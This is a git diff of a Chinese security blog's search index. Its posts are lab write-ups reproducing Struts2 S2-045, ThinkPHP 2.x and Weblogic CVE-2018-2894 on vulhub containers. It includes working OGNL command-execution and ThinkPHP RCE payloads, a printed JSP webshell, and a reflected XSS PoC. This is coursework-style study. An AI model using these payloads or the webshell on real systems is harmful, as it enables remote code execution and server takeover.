-
-<h2 id="删除密钥"><a href="#删除密钥" class="headerlink" title="删除密钥"></a>删除密钥</h2><p>删除密钥有三个选项：</p>
-<p>–delete-keys、–delete-secret-keys和–delete-secret-and-public-key<br>–delete-keys表示从公钥钥匙圈上删除密钥，也就是一同删除公钥和对应的私钥。在分批模式（batch mode）下，密钥必须使用指纹表示，或者使用–yes选项。<br>–delete-secret-keys表示从私钥钥匙圈上删除密钥。<br>–delete-secret-and-public-key和–delete-keys一样，但是如果私钥存在的话，会先移除私钥。在分批模式下，密钥必须使用指纹表示。</p>
-<p>例如我要删除我的公钥中的<code>testname</code>公钥，就输入下面的语句</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-keys testname</span><br></pre></td></tr></table></figure>
-
-<p>要删除<code>testname</code>私钥，就输入下面语句</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gpg --delete-secret-keys testname</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>参考链接:</p>
-<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">https://www.linuxprobe.com/gpg-encrypt-decrypt.html</a></p>
-<p><a href="https://blog.csdn.net/qq_33919450/article/details/115706604">https://blog.csdn.net/qq_33919450/article/details/115706604</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>GPG</tag>
-        <tag>Linux</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -941,42 +941,6 @@
         <tag>CTF</tag>
         <tag>PHP</tag>
         <tag>伪协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
-    <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
-<ol>
-<li>复现环境中的OGNL表达式注入漏洞，截图证明</li>
-<li>尝试利用漏洞执行系统命令，读取当前目录下的pom.xml内容，提供截图</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动struts2 2.3.30：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure>
-
-<p>将payload放在<code>Content-Type</code>后面发送数据包，可见<code>233*233</code>已成功执行：</p>
-<img data-src="https://images.gaifagafin.top/202311222309291.png" alt="回显" style="zoom:80%;" />
-
-<h1 id="读取pom-xml"><a href="#读取pom-xml" class="headerlink" title="读取pom.xml"></a>读取pom.xml</h1><p>构造payload，<code>cmd=</code>后面的内容改成<code>&#39;cat pom.xml&#39;</code>，将payload放在<code>Content-Type</code>后面发送数据包</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat pom.xml&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>读取到pom.xml的内容，箭头所指的cmd里面可以放任意指令</p>
-<p><img data-src="https://images.gaifagafin.top/202311222309513.png"></p>
-<p>进入容器验证，成功读取</p>
-<p><img data-src="https://images.gaifagafin.top/202311222309452.png"></p>
-<hr>
-<p>参考链接：<a href="https://www.jianshu.com/p/30f438eee93e">https://www.jianshu.com/p/30f438eee93e</a></p>
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1315,91 +1279,6 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
-    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
-<ol>
-<li>复现环境中的代码执行漏洞，截图证明</li>
-<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
-<img data-src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
-<p>即可执行<code>phpinfo()</code></p>
-<img data-src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
-
-<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
-<p>但是这里单引号双引号都被过滤了</p>
-<img data-src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
-
-<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20</span><br></pre></td></tr></table></figure>
-
-<p>得到文件列表</p>
-<p><img data-src="https://images.gaifagafin.top/202311112126522.png"></p>
-<p>进入容器验证</p>
-<img data-src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
-    <url>/2023/11/11/Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Weblogic 任意文件上传漏洞（CVE-2018-2894）</strong></p>
-<ol>
-<li>复现环境中的任意文件上传漏洞，截图证明</li>
-<li>上传WebShell（或反弹shell），并通过WebShell （或反弹shell）执行whoami命令，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/weblogic/CVE-2018-2894</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器</p>
-<p>浏览器访问<code>Your-ip:7001/console</code>即可看到后台登录页面</p>
-<img data-src="https://images.gaifagafin.top/202311112128112.png" style="zoom:67%;" />
-
-<p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code>。</p>
-<img data-src="https://images.gaifagafin.top/202311112128042.png" style="zoom: 80%;" />
-
-<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：</p>
-<img data-src="https://images.gaifagafin.top/202311112128891.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:7001/ws_utc/config.do</code></p>
-<p>设置Work Home Dir为</p>
-<p><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
-<p>我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
-<img data-src="https://images.gaifagafin.top/202311112128176.png" style="zoom:67%;" />
-
-<p>然后点击安全 -&gt; 增加，然后上传webshell：</p>
-<p><img data-src="https://images.gaifagafin.top/202311112128248.png"></p>
-<p>这里用burpsuite转发包到repeater再转发，查看返回的数据包，其中有时间戳，如果之前上传了多个shell脚本，选择最下面的一个时间戳</p>
-<img data-src="https://images.gaifagafin.top/202311112128015.png" style="zoom:67%;" />
-
-<p>然后访问使用另一个浏览器访问</p>
-<p><code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]?pwd=123&amp;cmd=ls</code></p>
-<p>即可执行ls命令查看当前目录：</p>
-<img data-src="https://images.gaifagafin.top/202311112128725.png" style="zoom:67%;" />
-
-<h2 id="执行whoami命令"><a href="#执行whoami命令" class="headerlink" title="执行whoami命令"></a>执行whoami命令</h2><p>浏览器输入<code>http://192.168.52.130:7001/ws_utc/css/config/keystore/1699702415808_shell.jsp?pwd=123&amp;cmd=whoami</code></p>
-<p>得到whoami回显<code>oracle</code></p>
-<img data-src="https://images.gaifagafin.top/202311112128942.png" style="zoom:67%;" />
-
-<p>这里贴出我使用的的木马</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;123&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
-        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1932,6 +1811,127 @@
       </tags>
   </entry>
   <entry>
+    <title>Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</title>
+    <url>/2023/11/22/Struts2-S2-045%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-5638/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Struts2 S2-045远程代码执行漏洞(CVE-2017-5638)</p>
+<ol>
+<li>复现环境中的OGNL表达式注入漏洞，截图证明</li>
+<li>尝试利用漏洞执行系统命令，读取当前目录下的pom.xml内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>执行如下命令启动struts2 2.3.30：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到上传页面。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br></pre></td></tr></table></figure>
+
+<p>将payload放在<code>Content-Type</code>后面发送数据包，可见<code>233*233</code>已成功执行：</p>
+<img data-src="https://images.gaifagafin.top/202311222309291.png" alt="回显" style="zoom:80%;" />
+
+<h1 id="读取pom-xml"><a href="#读取pom-xml" class="headerlink" title="读取pom.xml"></a>读取pom.xml</h1><p>构造payload，<code>cmd=</code>后面的内容改成<code>&#39;cat pom.xml&#39;</code>，将payload放在<code>Content-Type</code>后面发送数据包</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat pom.xml&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>读取到pom.xml的内容，箭头所指的cmd里面可以放任意指令</p>
+<p><img data-src="https://images.gaifagafin.top/202311222309513.png"></p>
+<p>进入容器验证，成功读取</p>
+<p><img data-src="https://images.gaifagafin.top/202311222309452.png"></p>
+<hr>
+<p>参考链接：<a href="https://www.jianshu.com/p/30f438eee93e">https://www.jianshu.com/p/30f438eee93e</a></p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
+    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
+<ol>
+<li>复现环境中的代码执行漏洞，截图证明</li>
+<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
+<img data-src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
+<p>即可执行<code>phpinfo()</code></p>
+<img data-src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
+
+<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
+<p>但是这里单引号双引号都被过滤了</p>
+<img data-src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
+
+<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20</span><br></pre></td></tr></table></figure>
+
+<p>得到文件列表</p>
+<p><img data-src="https://images.gaifagafin.top/202311112126522.png"></p>
+<p>进入容器验证</p>
+<img data-src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weblogic 任意文件上传漏洞（CVE-2018-2894）</title>
+    <url>/2023/11/11/Weblogic-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-2894%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Weblogic 任意文件上传漏洞（CVE-2018-2894）</strong></p>
+<ol>
+<li>复现环境中的任意文件上传漏洞，截图证明</li>
+<li>上传WebShell（或反弹shell），并通过WebShell （或反弹shell）执行whoami命令，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/weblogic/CVE-2018-2894</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器</p>
+<p>浏览器访问<code>Your-ip:7001/console</code>即可看到后台登录页面</p>
+<img data-src="https://images.gaifagafin.top/202311112128112.png" style="zoom:67%;" />
+
+<p>执行<code>docker-compose logs | grep password</code>可查看管理员密码，管理员用户名为<code>weblogic</code>。</p>
+<img data-src="https://images.gaifagafin.top/202311112128042.png" style="zoom: 80%;" />
+
+<p>登录后台页面，点击<code>base_domain</code>的配置，在“高级”中开启“启用 Web 服务测试页”选项：</p>
+<img data-src="https://images.gaifagafin.top/202311112128891.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:7001/ws_utc/config.do</code></p>
+<p>设置Work Home Dir为</p>
+<p><code>/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css</code></p>
+<p>我将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
+<img data-src="https://images.gaifagafin.top/202311112128176.png" style="zoom:67%;" />
+
+<p>然后点击安全 -&gt; 增加，然后上传webshell：</p>
+<p><img data-src="https://images.gaifagafin.top/202311112128248.png"></p>
+<p>这里用burpsuite转发包到repeater再转发，查看返回的数据包，其中有时间戳，如果之前上传了多个shell脚本，选择最下面的一个时间戳</p>
+<img data-src="https://images.gaifagafin.top/202311112128015.png" style="zoom:67%;" />
+
+<p>然后访问使用另一个浏览器访问</p>
+<p><code>http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]?pwd=123&amp;cmd=ls</code></p>
+<p>即可执行ls命令查看当前目录：</p>
+<img data-src="https://images.gaifagafin.top/202311112128725.png" style="zoom:67%;" />
+
+<h2 id="执行whoami命令"><a href="#执行whoami命令" class="headerlink" title="执行whoami命令"></a>执行whoami命令</h2><p>浏览器输入<code>http://192.168.52.130:7001/ws_utc/css/config/keystore/1699702415808_shell.jsp?pwd=123&amp;cmd=whoami</code></p>
+<p>得到whoami回显<code>oracle</code></p>
+<img data-src="https://images.gaifagafin.top/202311112128942.png" style="zoom:67%;" />
+
+<p>这里贴出我使用的的木马</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;123&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span><br><span class="line">        java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ecShop漏洞复现</title>
     <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="ecShop漏洞复现-2-X-3-X-4-X"><a href="#ecShop漏洞复现-2-X-3-X-4-X" class="headerlink" title="ecShop漏洞复现(2.X,3.X,4.X)"></a>ecShop漏洞复现(2.X,3.X,4.X)</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
@@ -2002,88 +2002,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>vulhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于建站</title>
-    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
-<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
-<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
-<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
-<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
-        <tag>图床</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>前端漏洞靶场环境——front</title>
-    <url>/2023/11/27/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94front/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：前端漏洞靶场环境——front(系统有两个用户： user1&#x2F;user1 、admin1&#x2F;admin1)，要求提交实验报告</p>
-<ol>
-<li>挖掘环境中的反射型XSS漏洞，（以弹框 test13 证明）</li>
-<li>复现环境中的CSRF漏洞，设计表单，当管理员点击URL以后自动将自己的密码重置为：123456</li>
-<li>复现环境中JSON Hijacking漏洞，在另一个网站（或本机另一个端口）获取用户信息</li>
-<li>通过在服务器Web目录创建.htaccess文件，控制服务器响应头，实现CORS漏洞，在另一网站，接收HTML接口的用户信息。</li>
-<li>挖掘环境中的URL跳转漏洞，构造请求，跳转到重邮官网</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8983</code>即可</p>
-<h1 id="漏洞挖掘与复现"><a href="#漏洞挖掘与复现" class="headerlink" title="漏洞挖掘与复现"></a>漏洞挖掘与复现</h1><h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p>使用用户名user1与密码user1登录<img data-src="https://images.gaifagafin.top/202312011004731.png"></p>
-<p>查看网站源码，发现参数<code>name</code>处可能存在XSS漏洞</p>
-<p><img data-src="https://images.gaifagafin.top/202312011004043.png"></p>
-<p>尝试构造PoC并发送，成功弹窗，证明存在反射型XSS漏洞</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.37.128:8983/front/info.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;test 13&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="https://images.gaifagafin.top/202312011004158.png"></p>
-<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>抓包查看用户点击修改密码时发送给服务器的数据包，可以看到新密码<code>newpassword</code>和确认密码<code>passwordrepeat</code>都是用<strong>POST</strong>传参</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/front/info.php?name=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8983</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.37.128:8983</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.37.128:8983/front/info.php?name=</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uid=dXNlcjE%3D; is_ad=1; PHPSESSID=ggoq5vok58252u9sdl3i043981</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-haxe"><span class="keyword">new</span><span class="type">password</span>=user1&amp;passwordrepeat=user1</span></span><br></pre></td></tr></table></figure>
-
-<p>开启攻击机的网络服务，在攻击机的www目录下建立一个html页面(<code>192.168.137.1:8888/test.html</code>)，构造修改密码功能表单，一旦受害者访问此页面，密码就会被改成<code>123456</code>，构造表单如下</p>
